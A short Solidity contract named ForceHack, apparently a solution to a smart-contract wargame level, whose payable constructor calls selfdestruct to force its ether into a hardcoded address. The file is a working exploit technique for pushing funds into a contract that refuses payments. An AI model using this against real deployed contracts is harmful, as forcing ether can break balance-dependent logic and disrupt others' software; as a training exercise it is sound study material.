// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceHack {
    constructor() public payable {
        selfdestruct(0x6c038Ff73928585BD29cEaE69C83f7067842E81c);
    }
}
